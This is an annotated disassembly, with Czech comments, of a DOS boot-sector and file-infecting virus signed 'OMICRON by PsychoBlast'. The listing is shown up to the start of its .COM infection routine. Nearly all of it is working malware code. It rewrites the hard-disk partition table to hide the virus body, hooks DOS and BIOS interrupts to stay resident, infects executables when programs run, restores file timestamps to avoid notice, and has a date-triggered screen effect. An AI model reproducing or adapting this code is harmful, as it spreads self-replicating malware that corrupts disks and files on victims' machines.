;=========================================================================
; VIRUS JAKO BOOT VIRUS.
;
4CDE:0000 FA             CLI
4CDE:0001 33C0           XOR    AX,AX
4CDE:0003 8ED0           MOV    SS,AX
4CDE:0005 BC007C         MOV    SP,7C00
4CDE:0008 FB             STI
4CDE:0009 B80300         MOV    AX,0003
4CDE:000C E81F00         CALL   003D
4CDE:000F 06             PUSH   ES
4CDE:0010 B84200         MOV    AX,0042
4CDE:0013 50             PUSH   AX
4CDE:0014 B8C007         MOV    AX,07C0
4CDE:0017 8ED8           MOV    DS,AX
4CDE:0019 B80502         MOV    AX,0205
4CDE:001C 8B0E2A00       MOV    CX,[002A]
4CDE:0020 41             INC    CX
4CDE:0021 8B162C00       MOV    DX,[002C]
4CDE:0025 CD13           INT    13
4CDE:0027 CB             RETF

4CDE:0028  01-FE 8C 65 80 03 33 DB 33         .~.e..3[3

4CDE:002E 33DB           XOR    BX,BX
4CDE:0030 33FF           XOR    DI,DI
4CDE:0032 8EC3           MOV    ES,BX
4CDE:0034 2629061304     SUB    ES:[0413],AX
4CDE:0039 CD12           INT    12
4CDE:003B B106           MOV    CL,06
4CDE:003D D3E0           SHL    AX,CL
4CDE:003F 8EC0           MOV    ES,AX
4CDE:0041 C3             RET
;
; Potud KOPIROVANO DO BOOT.
;
4CDE:0042 0E             PUSH   CS
4CDE:0043 1F             POP    DS
4CDE:0044 33C0           XOR    AX,AX
4CDE:0046 8EC0           MOV    ES,AX
4CDE:0048 BB007C         MOV    BX,7C00
4CDE:004B 50             PUSH   AX
4CDE:004C 53             PUSH   BX
4CDE:004D B80102         MOV    AX,0201
4CDE:0050 8B0E2A00       MOV    CX,[002A]
4CDE:0054 8B162C00       MOV    DX,[002C]
4CDE:0058 CD13           INT    13
4CDE:005A A16708         MOV    AX,[0867]
4CDE:005D 48             DEC    AX
4CDE:005E 3D0C00         CMP    AX,000C
4CDE:0061 7625           JBE    0097
4CDE:0063 B80012         MOV    AX,1200
4CDE:0066 BB10FF         MOV    BX,FF10
4CDE:0069 CD10           INT    10
4CDE:006B 0AFF           OR     BH,BH
4CDE:006D 7519           JNZ    0097
4CDE:006F B404           MOV    AH,04
4CDE:0071 CD1A           INT    1A
4CDE:0073 80FA02         CMP    DL,02
4CDE:0076 7510           JNZ    0097
4CDE:0078 B80400         MOV    AX,0004
4CDE:007B E8B0FF         CALL   003D
4CDE:007E E87401         CALL   0204
4CDE:0081 C606E90000     MOV    Byte Ptr [00E9],00
4CDE:0086 EB05           JMP    009C
4CDE:0088 C606E90001     MOV    Byte Ptr [00E9],01
4CDE:008D FA             CLI

4CDE:008E 33C0           XOR    AX,AX
4CDE:0090 8EC0           MOV    ES,AX
4CDE:0092 26C41E7000     LES    BX,ES:[0070]
4CDE:0097 891ED700       MOV    [00D7],BX
4CDE:009B 8C06D900       MOV    [00D9],ES
4CDE:009F 8EC0           MOV    ES,AX
4CDE:00A1 26C41E8400     LES    BX,ES:[0084]
4CDE:00A6 891E6308       MOV    [0863],BX
4CDE:00AA 8C066508       MOV    [0865],ES
4CDE:00AE 8EC0           MOV    ES,AX
4CDE:00B0 26C70670009803 MOV    Word Ptr ES:[0070],0398
4CDE:00B7 268C1E7200     MOV    ES:[0072],DS
4CDE:00BC FB             STI
4CDE:00BD CB             RETF

4CDE:00BE                                         01 E9 2D               .i-
4CDE:00C1  0E AD 0A 93 49 D5 48 17-0E C4 11 00 20 00 46 11  .-..IUH..D.. .F.
4CDE:00D1  04 00 00 00 00 00 47 29-0B 49 BC 16 0B 49 BF 05  ......G).I<..I?.
4CDE:00E1  C4 11 10 00 00 02 83 3E-01 00 00 0E 00 00 01 00  D......>........
4CDE:00F1  00 1C 00 40 9E 19 02 03-FF 4F 4D 49 43 52 4F 4E  ...@.....OMICRON
4CDE:0101  20 62 79 20 50 73 79 63-68 6F 42 6C 61 73 74      by PsychoBlast
;=========================================================================
4CDE:011F E80000         CALL   0122
4CDE:0122 5E             POP    SI        ;-------------------------------
4CDE:0123 81EE1301       SUB    SI,0113   ;
4CDE:0127 56             PUSH   SI
4CDE:0128 50             PUSH   AX
4CDE:0129 06             PUSH   ES
4CDE:012A 0E             PUSH   CS
4CDE:012B 1F             POP    DS
4CDE:012C 8CC0           MOV    AX,ES
4CDE:012E 0184C400       ADD    [SI+00C4],AX
4CDE:0132 0184C600       ADD    [SI+00C6],AX
4CDE:0136 80BCBE0000     CMP    Byte Ptr [SI+00BE],00
4CDE:013B 750E           JNZ    014B      ; rozskok podle .COM a .EXE
4CDE:013D 8B84BF00       MOV    AX,[SI+00BF]
4CDE:0141 A30001         MOV    [0100],AX
4CDE:0144 8A84C100       MOV    AL,[SI+00C1]
4CDE:0148 A20201         MOV    [0102],AL
4CDE:014B B801FE         MOV    AX,FE01        ;--------------------------
4CDE:014E CD21           INT    21             ;         TEST PRITOMNOSTI.
4CDE:0150 3DFE01         CMP    AX,01FE        ;--------------------------
4CDE:0153 7447           JZ     019C
4CDE:0155 80BCBE0000     CMP    Byte Ptr [SI+00BE],00
4CDE:015A 7505           JNZ    0161
4CDE:015C 83FCF0         CMP    SP,-10
4CDE:015F 723B           JB     019C
4CDE:0161 8CC0           MOV    AX,ES
4CDE:0163 48             DEC    AX
4CDE:0164 8EC0           MOV    ES,AX
4CDE:0166 26803E00005A   CMP    Byte Ptr ES:[0000],5A   ; MODIFIKACE
4CDE:016C 752E           JNZ    019C                    ;          PAMETI.
4CDE:016E 26A10300       MOV    AX,ES:[0003]
4CDE:0172 2DA700         SUB    AX,00A7
4CDE:0175 7225           JB     019C
4CDE:0177 26A30300       MOV    ES:[0003],AX
4CDE:017B 26812E1200A700 SUB    Word Ptr ES:[0012],00A7
4CDE:0182 268E061200     MOV    ES,ES:[0012]
4CDE:0187 33FF           XOR    DI,DI
4CDE:0189 B96908         MOV    CX,0869
4CDE:018C FC             CLD
4CDE:018D F3             REPZ                          ; KOPIRUJEME NAHORU
4CDE:018E A4             MOVSB                         ; DO PAMETI.
4CDE:018F 06             PUSH   ES
4CDE:0190 1F             POP    DS
4CDE:0191 C606E90001     MOV    Byte Ptr [00E9],01
4CDE:0196 E8BC00         CALL   0255       ; PRENESENI DO PARTITION TABLE.
4CDE:0199 E88401         CALL   0320       ; NOVA OBSLUHA INT 21H.
4CDE:019C 07             POP    ES
4CDE:019D 58             POP    AX
4CDE:019E 06             PUSH   ES
4CDE:019F 1F             POP    DS
4CDE:01A0 5E             POP    SI
4CDE:01A1 2E8E94C600     MOV    SS,CS:[SI+00C6]
4CDE:01A6 2EFFACC200     JMP    FAR CS:[SI+00C2]
;=========================================================================
; ODTUD KE VSEM ADRESAM PRICIST 0FH.
;
4CDE:01AB 50             PUSH   AX
4CDE:01AC 51             PUSH   CX
4CDE:01AD 52             PUSH   DX
4CDE:01AE B402           MOV    AH,02
4CDE:01B0 CD1A           INT    1A
4CDE:01B2 80FD10         CMP    CH,10
4CDE:01B5 7549           JNZ    0200
4CDE:01B7 53             PUSH   BX
4CDE:01B8 06             PUSH   ES
4CDE:01B9 1E             PUSH   DS
4CDE:01BA 0E             PUSH   CS
4CDE:01BB 1F             POP    DS
4CDE:01BC C606E90001     MOV    Byte Ptr [00E9],01
4CDE:01C1 B81035         MOV    AX,3510
4CDE:01C4 CD21           INT    21
4CDE:01C6 891ED300       MOV    [00D3],BX
4CDE:01CA 8C06D500       MOV    [00D5],ES
4CDE:01CE B81025         MOV    AX,2510
4CDE:01D1 BAE703         MOV    DX,03E7
4CDE:01D4 CD21           INT    21
4CDE:01D6 B403           MOV    AH,03
4CDE:01D8 32FF           XOR    BH,BH
4CDE:01DA CD10           INT    10
4CDE:01DC 33C0           XOR    AX,AX
4CDE:01DE 8EC0           MOV    ES,AX
4CDE:01E0 8CC9           MOV    CX,CS
4CDE:01E2 81E90001       SUB    CX,0100
4CDE:01E6 26A3A804       MOV    ES:[04A8],AX
4CDE:01EA 26890EAA04     MOV    ES:[04AA],CX
4CDE:01EF 26A04904       MOV    AL,ES:[0449]
4CDE:01F3 0480           ADD    AL,80
4CDE:01F5 32E4           XOR    AH,AH
4CDE:01F7 CD10           INT    10
4CDE:01F9 B402           MOV    AH,02
4CDE:01FB CD10           INT    10
4CDE:01FD 1F             POP    DS
4CDE:01FE 07             POP    ES
4CDE:01FF 5B             POP    BX
4CDE:0200 5A             POP    DX
4CDE:0201 59             POP    CX
4CDE:0202 58             POP    AX
4CDE:0203 C3             RET
;=========================================================================
4CDE:0204 1E             PUSH   DS
4CDE:0205 33C0           XOR    AX,AX
4CDE:0207 8ED8           MOV    DS,AX
4CDE:0209 C536A804       LDS    SI,[04A8]
4CDE:020D B91C00         MOV    CX,001C
4CDE:0210 FC             CLD
4CDE:0211 F3             REPZ
4CDE:0212 A4             MOVSB
4CDE:0213 26C7060800EC00 MOV    Word Ptr ES:[0008],00EC
4CDE:021A 268C0E0A00     MOV    ES:[000A],CS
4CDE:021F 2E8C06F400     MOV    CS:[00F4],ES
4CDE:0224 06             PUSH   ES
4CDE:0225 B83011         MOV    AX,1130
4CDE:0228 B702           MOV    BH,02
4CDE:022A CD10           INT    10
4CDE:022C 06             PUSH   ES
4CDE:022D 1F             POP    DS
4CDE:022E 8BF5           MOV    SI,BP
4CDE:0230 07             POP    ES
4CDE:0231 BA0001         MOV    DX,0100
4CDE:0234 B90E00         MOV    CX,000E
4CDE:0237 83C70D         ADD    DI,+0D
4CDE:023A AC             LODSB
4CDE:023B 32E4           XOR    AH,AH
4CDE:023D B308           MOV    BL,08
4CDE:023F D0E8           SHR    AL,1
4CDE:0241 D0D4           RCL    AH,1
4CDE:0243 FECB           DEC    BL
4CDE:0245 75F8           JNZ    023F
4CDE:0247 268825         MOV    ES:[DI],AH
4CDE:024A 4F             DEC    DI
4CDE:024B E2ED           LOOP   023A
4CDE:024D 83C70F         ADD    DI,+0F
4CDE:0250 4A             DEC    DX
4CDE:0251 75E1           JNZ    0234
4CDE:0253 1F             POP    DS
4CDE:0254 C3             RET
;=========================================================================
4CDE:0255 B81335         MOV    AX,3513
4CDE:0258 CD21           INT    21
4CDE:025A 891E6308       MOV    [0863],BX
4CDE:025E 8C066508       MOV    [0865],ES
4CDE:0262 C7067D030001   MOV    Word Ptr [037D],0100
4CDE:0268 B80102         MOV    AX,0201  ; Nacteni PARTITION table z
4CDE:026B BB6908         MOV    BX,0869  ; pevneho disku.
4CDE:026E B90100         MOV    CX,0001
4CDE:0271 BA8000         MOV    DX,0080
4CDE:0274 1E             PUSH   DS
4CDE:0275 07             POP    ES       ;
4CDE:0276 E8D000         CALL   0349     ;
4CDE:0279 81BF280001FE   CMP    Word Ptr [BX+0028],FE01 ; TEST PRITOMNOSTI
4CDE:027F 741A           JZ     029B                    ; viru na disku.
4CDE:0281 81C3BE01       ADD    BX,01BE  ; JDEME NA PARTITION TABLE.
4CDE:0285 B104           MOV    CL,04    ;
4CDE:0287 8A4704         MOV    AL,[BX+04] ; TESTUJEME TYP PARTITION.
4CDE:028A 3C04           CMP    AL,04      ; 4 DOS 16 bit FAT
4CDE:028C 7410           JZ     029E       ;
4CDE:028E 3C06           CMP    AL,06      ;
4CDE:0290 740C           JZ     029E       ;
4CDE:0292 3C01           CMP    AL,01      ; 1 DOS 12 bit FAT
4CDE:0294 7408           JZ     029E
4CDE:0296 83C310         ADD    BX,+10
4CDE:0299 E2EC           LOOP   0287       ; Koncime pokud nebyl rozeznan
4CDE:029B E98100         JMP    031F       ; typ partition.
4CDE:029E 8A7705         MOV    DH,[BX+05] ;------------------------------
4CDE:02A1 89162C00       MOV    [002C],DX  ; Hlava konce partition
4CDE:02A5 8B4706         MOV    AX,[BX+06] ; CYLINDER+SEKTOR
4CDE:02A8 8BC8           MOV    CX,AX      ;
4CDE:02AA BE0600         MOV    SI,0006    ;
4CDE:02AD 253F00         AND    AX,003F    ; Vypreparujeme sektor.
4CDE:02B0 3BC6           CMP    AX,SI      ; A pokud je mensi nez 6,
4CDE:02B2 766B           JBE    031F                                konec.
4CDE:02B4 2BCE           SUB    CX,SI      ; Zmensime cislo sektoru o 6
4CDE:02B6 894F06         MOV    [BX+06],CX ; a vratime do PART. TABLE.
4CDE:02B9 41             INC    CX         ;
4CDE:02BA 890E2A00       MOV    [002A],CX  ;
4CDE:02BE 29770C         SUB    [BX+0C],SI ; Zmensime zaroven pocet bloku.
4CDE:02C1 835F0E00       SBB    Word Ptr [BX+0E],+00
4CDE:02C5 8BEB           MOV    BP,BX      ;
4CDE:02C7 B80103         MOV    AX,0301    ; PARTITION TABLE zapiseme zpet
4CDE:02CA BB6908         MOV    BX,0869    ; na konec partition.
4CDE:02CD 9C             PUSHF
4CDE:02CE FF1E6308       CALL   FAR [0863] ;------------------------------
4CDE:02D2 724B           JB     031F
4CDE:02D4 B80503         MOV    AX,0305    ; Dale tam zapiseme cely virus.
4CDE:02D7 BB0000         MOV    BX,0000    ;
4CDE:02DA 41             INC    CX
4CDE:02DB 9C             PUSHF
4CDE:02DC FF1E6308       CALL   FAR [0863] ;------------------------------
4CDE:02E0 723D           JB     031F       ; Do PARTITION TABLE kopirujeme
4CDE:02E2 BE0000         MOV    SI,0000    ; prvnich 42 byte.
4CDE:02E5 BF6908         MOV    DI,0869    ;
4CDE:02E8 B94200         MOV    CX,0042
4CDE:02EB FC             CLD
4CDE:02EC F3             REPZ
4CDE:02ED A4             MOVSB
4CDE:02EE B80103         MOV    AX,0301    ; Takto upravenou zapiseme na
4CDE:02F1 BB6908         MOV    BX,0869    ; disk.
4CDE:02F4 B90100         MOV    CX,0001
4CDE:02F7 32F6           XOR    DH,DH
4CDE:02F9 9C             PUSHF
4CDE:02FA FF1E6308       CALL   FAR [0863]
4CDE:02FE 721F           JB     031F
4CDE:0300 B80102         MOV    AX,0201
4CDE:0303 3E8B4E02       MOV    CX,DS:[BP+02]
4CDE:0307 3E8A7601       MOV    DH,DS:[BP+01]
4CDE:030B 9C             PUSHF
4CDE:030C FF1E6308       CALL   FAR [0863]
4CDE:0310 720D           JB     031F
4CDE:0312 836F1306       SUB    Word Ptr [BX+13],+06
4CDE:0316 90             NOP
4CDE:0317 B80103         MOV    AX,0301
4CDE:031A 9C             PUSHF
4CDE:031B FF1E6308       CALL   FAR [0863]
4CDE:031F C3             RET
;=========================================================================
4CDE:0320 B82135         MOV    AX,3521    ; Redefinice preruseni 21H.
4CDE:0323 CD21           INT    21
4CDE:0325 891EDB00       MOV    [00DB],BX
4CDE:0329 8C06DD00       MOV    [00DD],ES
4CDE:032D 891E6308       MOV    [0863],BX
4CDE:0331 8C066508       MOV    [0865],ES
4CDE:0335 C7067D032003   MOV    Word Ptr [037D],0320
4CDE:033B B430           MOV    AH,30
4CDE:033D E80900         CALL   0349
4CDE:0340 B82125         MOV    AX,2521
4CDE:0343 BA7304         MOV    DX,0473
4CDE:0346 CD21           INT    21
4CDE:0348 C3             RET
;=========================================================================
4CDE:0349 50             PUSH   AX
4CDE:034A 53             PUSH   BX
4CDE:034B 52             PUSH   DX
4CDE:034C 06             PUSH   ES
4CDE:034D B80135         MOV    AX,3501
4CDE:0350 CD21           INT    21
4CDE:0352 8BF3           MOV    SI,BX
4CDE:0354 8CC7           MOV    DI,ES
4CDE:0356 B80125         MOV    AX,2501
4CDE:0359 BA7703         MOV    DX,0377
4CDE:035C CD21           INT    21
4CDE:035E 9C             PUSHF
4CDE:035F 58             POP    AX
4CDE:0360 0D0001         OR     AX,0100
4CDE:0363 50             PUSH   AX
4CDE:0364 9D             POPF
4CDE:0365 07             POP    ES
4CDE:0366 5A             POP    DX
4CDE:0367 5B             POP    BX
4CDE:0368 58             POP    AX
4CDE:0369 FA             CLI
4CDE:036A 9C             PUSHF
4CDE:036B FF1E6308       CALL   FAR [0863]
4CDE:036F 50             PUSH   AX
4CDE:0370 52             PUSH   DX
4CDE:0371 1E             PUSH   DS
4CDE:0372 9C             PUSHF
4CDE:0373 58             POP    AX
4CDE:0374 25FFFE         AND    AX,FEFF
4CDE:0377 50             PUSH   AX
4CDE:0378 9D             POPF
4CDE:0379 B80125         MOV    AX,2501
4CDE:037C 8BD6           MOV    DX,SI
4CDE:037E 8EDF           MOV    DS,DI
4CDE:0380 CD21           INT    21
4CDE:0382 1F             POP    DS
4CDE:0383 5A             POP    DX
4CDE:0384 58             POP    AX
4CDE:0385 C3             RET
;=========================================================================
; OBSLUHA PRERUSENI 01H.
;
4CDE:0386 55             PUSH   BP
4CDE:0387 8BEC           MOV    BP,SP
4CDE:0389 817E040001     CMP    Word Ptr [BP+04],0100
4CDE:038E 7715           JA     03A5
4CDE:0390 50             PUSH   AX
4CDE:0391 06             PUSH   ES
4CDE:0392 C44602         LES    AX,[BP+02]
4CDE:0395 2EA36308       MOV    CS:[0863],AX
4CDE:0399 2E8C066508     MOV    CS:[0865],ES
4CDE:039E 07             POP    ES
4CDE:039F 58             POP    AX
4CDE:03A0 816606FFFE     AND    Word Ptr [BP+06],FEFF
4CDE:03A5 5D             POP    BP
4CDE:03A6 CF             IRET
4CDE:03A7 06             PUSH   ES
4CDE:03A8 53             PUSH   BX
4CDE:03A9 50             PUSH   AX
4CDE:03AA 33C0           XOR    AX,AX
4CDE:03AC 8EC0           MOV    ES,AX
4CDE:03AE 26C41E8400     LES    BX,ES:[0084]
4CDE:03B3 8CC0           MOV    AX,ES
4CDE:03B5 2E3B066508     CMP    AX,CS:[0865]
4CDE:03BA 7507           JNZ    03C3
4CDE:03BC 2E3B1E6308     CMP    BX,CS:[0863]
4CDE:03C1 742F           JZ     03F2
4CDE:03C3 1E             PUSH   DS
4CDE:03C4 0E             PUSH   CS
4CDE:03C5 1F             POP    DS
4CDE:03C6 891EDB00       MOV    [00DB],BX
4CDE:03CA 8C06DD00       MOV    [00DD],ES
4CDE:03CE 891E6308       MOV    [0863],BX
4CDE:03D2 8C066508       MOV    [0865],ES
4CDE:03D6 33C0           XOR    AX,AX
4CDE:03D8 8ED8           MOV    DS,AX
4CDE:03DA C70684007304   MOV    Word Ptr [0084],0473
4CDE:03E0 8C0E8600       MOV    [0086],CS
4CDE:03E4 2EC41ED700     LES    BX,CS:[00D7]
4CDE:03E9 891E7000       MOV    [0070],BX
4CDE:03ED 8C067200       MOV    [0072],ES
4CDE:03F1 1F             POP    DS
4CDE:03F2 58             POP    AX
4CDE:03F3 5B             POP    BX
4CDE:03F4 07             POP    ES
4CDE:03F5 CF             IRET
;=========================================================================
; OBSLUHA PRERUSENI 10H
;
4CDE:03F6 9C             PUSHF
4CDE:03F7 0AE4           OR     AH,AH
4CDE:03F9 7535           JNZ    0430
4CDE:03FB 50             PUSH   AX
4CDE:03FC 52             PUSH   DX
4CDE:03FD 1E             PUSH   DS
4CDE:03FE 0E             PUSH   CS
4CDE:03FF 1F             POP    DS
4CDE:0400 247F           AND    AL,7F
4CDE:0402 3C03           CMP    AL,03
4CDE:0404 7714           JA     041A
4CDE:0406 3C02           CMP    AL,02
4CDE:0408 7210           JB     041A
4CDE:040A C706EA000000   MOV    Word Ptr [00EA],0000
4CDE:0410 B81C25         MOV    AX,251C
4CDE:0413 BA2704         MOV    DX,0427
4CDE:0416 CD21           INT    21
4CDE:0418 EB13           JMP    042D
4CDE:041A B81C25         MOV    AX,251C
4CDE:041D BA2008         MOV    DX,0820
4CDE:0420 CD21           INT    21
4CDE:0422 BAD403         MOV    DX,03D4
4CDE:0425 B80C00         MOV    AX,000C
4CDE:0428 EF             OUT    DX,AX
4CDE:0429 B80D00         MOV    AX,000D
4CDE:042C EF             OUT    DX,AX
4CDE:042D 1F             POP    DS
4CDE:042E 5A             POP    DX
4CDE:042F 58             POP    AX
4CDE:0430 9D             POPF
4CDE:0431 2EFF2ED300     JMP    FAR CS:[00D3]
;=========================================================================
; NOVA OBSLUHA PRERUSENI 1CH
;
4CDE:0436 1E             PUSH   DS
4CDE:0437 06             PUSH   ES
4CDE:0438 56             PUSH   SI
4CDE:0439 57             PUSH   DI
4CDE:043A 50             PUSH   AX
4CDE:043B 51             PUSH   CX
4CDE:043C 52             PUSH   DX
4CDE:043D BAD403         MOV    DX,03D4
4CDE:0440 B80C10         MOV    AX,100C
4CDE:0443 EF             OUT    DX,AX
4CDE:0444 B80D00         MOV    AX,000D
4CDE:0447 EF             OUT    DX,AX
4CDE:0448 B800B8         MOV    AX,B800
4CDE:044B 8ED8           MOV    DS,AX
4CDE:044D B800BA         MOV    AX,BA00
4CDE:0450 8EC0           MOV    ES,AX
4CDE:0452 2E8B36EA00     MOV    SI,CS:[00EA]
4CDE:0457 BF9E0F         MOV    DI,0F9E
4CDE:045A 2BFE           SUB    DI,SI
4CDE:045C FC             CLD
4CDE:045D B9F401         MOV    CX,01F4
4CDE:0460 AD             LODSW
4CDE:0461 268905         MOV    ES:[DI],AX
4CDE:0464 83EF02         SUB    DI,+02
4CDE:0467 E2F7           LOOP   0460
4CDE:0469 2E8936EA00     MOV    CS:[00EA],SI
4CDE:046E 81FEA00F       CMP    SI,0FA0
4CDE:0472 7206           JB     047A
4CDE:0474 33C0           XOR    AX,AX
4CDE:0476 2EA3EA00       MOV    CS:[00EA],AX
4CDE:047A 5A             POP    DX
4CDE:047B 59             POP    CX
4CDE:047C 58             POP    AX
4CDE:047D 5F             POP    DI
4CDE:047E 5E             POP    SI
4CDE:047F 07             POP    ES
4CDE:0480 1F             POP    DS
4CDE:0481 CF             IRET
;=========================================================================
; OBSLUHA PRERUSENI 21H
;
4CDE:0482 9C             PUSHF                 ;
4CDE:0483 3D2125         CMP    AX,2521        ;
4CDE:0486 750C           JNZ    0494           ;--------------------------
4CDE:0488 2E8916DB00     MOV    CS:[00DB],DX   ; SET INTERRUPT 21H.
4CDE:048D 2E8C1EDD00     MOV    CS:[00DD],DS   ;
4CDE:0492 EB5E           JMP    04F2           ;--------------------------
4CDE:0494 3D2135         CMP    AX,3521
4CDE:0497 7507           JNZ    04A0           ;--------------------------
4CDE:0499 2EC41EDB00     LES    BX,CS:[00DB]   ; GET INTERRUPT 21H.
4CDE:049E EB52           JMP    04F2           ;--------------------------
4CDE:04A0 80FC4B         CMP    AH,4B
4CDE:04A3 752E           JNZ    04D3
4CDE:04A5 0AC0           OR     AL,AL
4CDE:04A7 7524           JNZ    04CD           ;--------------------------
4CDE:04A9 50             PUSH   AX             ; EXECUTE PROGRAM.
4CDE:04AA 2E8926C800     MOV    CS:[00C8],SP   ;
4CDE:04AF 2E8C16CA00     MOV    CS:[00CA],SS   ;
4CDE:04B4 FA             CLI                   ;
4CDE:04B5 8CC8           MOV    AX,CS          ;
4CDE:04B7 8ED0           MOV    SS,AX          ;
4CDE:04B9 BC690A         MOV    SP,0A69        ;
4CDE:04BC FB             STI                   ;
4CDE:04BD E86200         CALL   0522           ;
4CDE:04C0 FA             CLI                   ;
4CDE:04C1 2E8E16CA00     MOV    SS,CS:[00CA]   ;
4CDE:04C6 2E8B26C800     MOV    SP,CS:[00C8]   ;
4CDE:04CB FB             STI                   ;
4CDE:04CC 58             POP    AX             ;
4CDE:04CD 9D             POPF                  ;
4CDE:04CE 2EFF2E6308     JMP    FAR CS:[0863]  ;--------------------------
4CDE:04D3 3D01FE         CMP    AX,FE01
4CDE:04D6 7504           JNZ    04DC           ;--------------------------
4CDE:04D8 F7D0           NOT    AX             ; IS PRESENT IN MEMORY ?
4CDE:04DA EB16           JMP    04F2           ;--------------------------
4CDE:04DC 2E803EE90001   CMP    Byte Ptr CS:[00E9],01 ;
4CDE:04E2 7403           JZ     04E7           ;
4CDE:04E4 E8C4FC         CALL   01AB           ;
4CDE:04E7 2EFF06E700     INC    Word Ptr CS:[00E7]
4CDE:04EC 9D             POPF                  ;
4CDE:04ED 2EFF2EDB00     JMP    FAR CS:[00DB]  ;
4CDE:04F2 9D             POPF
4CDE:04F3 CF             IRET
;=========================================================================
4CDE:04F4 B003           MOV    AL,03          ; Obsluha preruseni 24H.
4CDE:04F6 CF             IRET   ;-----------------------------------------
4CDE:04F7 B440           MOV    AH,40
4CDE:04F9 EB02           JMP    04FD
4CDE:04FB B43F           MOV    AH,3F
4CDE:04FD E81500         CALL   0515
4CDE:0500 7202           JB     0504
4CDE:0502 2BC1           SUB    AX,CX
4CDE:0504 C3             RET
4CDE:0505 33C9           XOR    CX,CX
4CDE:0507 33D2           XOR    DX,DX
4CDE:0509 B80242         MOV    AX,4202
4CDE:050C EB07           JMP    0515
4CDE:050E 33C9           XOR    CX,CX
4CDE:0510 33D2           XOR    DX,DX
4CDE:0512 B80042         MOV    AX,4200       ; SEEK
4CDE:0515 2E8B1E6108     MOV    BX,CS:[0861]  ; HANDLER
4CDE:051A FA             CLI                  ; VOLANI OPERACNIHO SYSTEMU.
4CDE:051B 9C             PUSHF
4CDE:051C 2EFF1E6308     CALL   FAR CS:[0863]
4CDE:0521 C3             RET
;=========================================================================
;
;
4CDE:0522 53             PUSH   BX
4CDE:0523 51             PUSH   CX
4CDE:0524 56             PUSH   SI
4CDE:0525 57             PUSH   DI
4CDE:0526 06             PUSH   ES
4CDE:0527 52             PUSH   DX
4CDE:0528 1E             PUSH   DS
4CDE:0529 0E             PUSH   CS
4CDE:052A 1F             POP    DS
4CDE:052B B80033         MOV    AX,3300     ; Cti stav Ctrl BREAK
4CDE:052E E8E9FF         CALL   051A        ;
4CDE:0531 8816CC00       MOV    [00CC],DL   ; a uloz.
4CDE:0535 B80133         MOV    AX,3301     ; Nuluj Ctrl BREAK.
4CDE:0538 33D2           XOR    DX,DX       ;
4CDE:053A E8DDFF         CALL   051A        ;=============================
4CDE:053D B82435         MOV    AX,3524     ; Precteni a nastaveni preru-
4CDE:0540 E8D7FF         CALL   051A        ; seni 24H.
4CDE:0543 891EDF00       MOV    [00DF],BX   ;
4CDE:0547 8C06E100       MOV    [00E1],ES   ;
4CDE:054B B82425         MOV    AX,2524     ;
4CDE:054E BAE504         MOV    DX,04E5     ;
4CDE:0551 E8C6FF         CALL   051A        ;=============================
4CDE:0554 1F             POP    DS
4CDE:0555 5A             POP    DX
4CDE:0556 52             PUSH   DX
4CDE:0557 1E             PUSH   DS
4CDE:0558 B80043         MOV    AX,4300      ;============================
4CDE:055B E8BCFF         CALL   051A         ; Precti a uloz atributy
4CDE:055E 2E890ECD00     MOV    CS:[00CD],CX ; souboru,
4CDE:0563 B80143         MOV    AX,4301      ; a nasledne nastav R/W
4CDE:0566 33C9           XOR    CX,CX        ; pristup.
4CDE:0568 E8AFFF         CALL   051A         ;============================
4CDE:056B 727D           JB     05EA
4CDE:056D B8023D         MOV    AX,3D02     ;=============================
4CDE:0570 E8A7FF         CALL   051A        ; Otevri soubor.
4CDE:0573 726A           JB     05DF        ;
4CDE:0575 0E             PUSH   CS
4CDE:0576 1F             POP    DS
4CDE:0577 A36108         MOV    [0861],AX
4CDE:057A B80057         MOV    AX,5700     ;=============================
4CDE:057D E895FF         CALL   0515        ; Precti a odloz datum
4CDE:0580 7246           JB     05C8        ; posledni zmeny.
4CDE:0582 8916CF00       MOV    [00CF],DX
4CDE:0586 890ED100       MOV    [00D1],CX
4CDE:058A BAB8FF         MOV    DX,FFB8     ;=============================
4CDE:058D B9FFFF         MOV    CX,FFFF     ; SEEK na konec - ????
4CDE:0590 E876FF         CALL   0509
4CDE:0593 7233           JB     05C8
4CDE:0595 BA6908         MOV    DX,0869     ;=============================
4CDE:0598 B90200         MOV    CX,0002     ; Precti 2 Byte.
4CDE:059B E85DFF         CALL   04FB
4CDE:059E 7228           JB     05C8
4CDE:05A0 813E69080EBB   CMP    Word Ptr [0869],BB0E
4CDE:05A6 7420           JZ     05C8
4CDE:05A8 E863FF         CALL   050E        ; SEEK na zacatek.
4CDE:05AB 721B           JB     05C8
4CDE:05AD BA6908         MOV    DX,0869     ;=============================
4CDE:05B0 B91C00         MOV    CX,001C     ; Precti 1C byte od pocatku.
4CDE:05B3 E845FF         CALL   04FB
4CDE:05B6 7210           JB     05C8
4CDE:05B8 813E69084D5A   CMP    Word Ptr [0869],5A4D
4CDE:05BE 7405           JZ     05C5
;-------------------------------------------------------------------------
4CDE:05C0 E84500         CALL   0608       ; .COM SOUBOR
4CDE:05C3 EB03           JMP    05C8
;-------------------------------------------------------------------------
4CDE:05C5 E8A000         CALL   0668       ; .EXE SOUBOR
4CDE:05C8 B80157         MOV    AX,5701    ;==============================
4CDE:05CB 8B16CF00       MOV    DX,[00CF]  ; Nastav stav posledni zmeny
4CDE:05CF 8B0ED100       MOV    CX,[00D1]
4CDE:05D3 E83FFF         CALL   0515
4CDE:05D6 B43E           MOV    AH,3E      ;==============================
4CDE:05D8 E83AFF         CALL   0515       ; Zavri soubor.
4CDE:05DB 1F             POP    DS
4CDE:05DC 5A             POP    DX
4CDE:05DD 52             PUSH   DX
4CDE:05DE 1E             PUSH   DS
4CDE:05DF B80143         MOV    AX,4301    ;==============================
4CDE:05E2 2E8B0ECD00     MOV    CX,CS:[00CD]    ; Nastav atributy souboru.
4CDE:05E7 E830FF         CALL   051A
4CDE:05EA B82425         MOV    AX,2524    ;==============================
4CDE:05ED 2EC516DF00     LDS    DX,CS:[00DF]    ; Obnov puvodni int 24H.
4CDE:05F2 E825FF         CALL   051A
4CDE:05F5 B80133         MOV    AX,3301    ;==============================
4CDE:05F8 2E8A16CC00     MOV    DL,CS:[00CC]    ; Obnov stav Ctrl BREAK.
4CDE:05FD E81AFF         CALL   051A
4CDE:0600 1F             POP    DS
4CDE:0601 5A             POP    DX
4CDE:0602 07             POP    ES
4CDE:0603 5F             POP    DI
4CDE:0604 5E             POP    SI
4CDE:0605 59             POP    CX
4CDE:0606 5B             POP    BX
4CDE:0607 C3             RET
;=========================================================================
; NAKAZENI SOUBORU TYPU .COM
;
4CDE:0608 E8FAFE         CALL   0505          ; SEEK na konec souboru.
4CDE:060B 725A           JB     0667
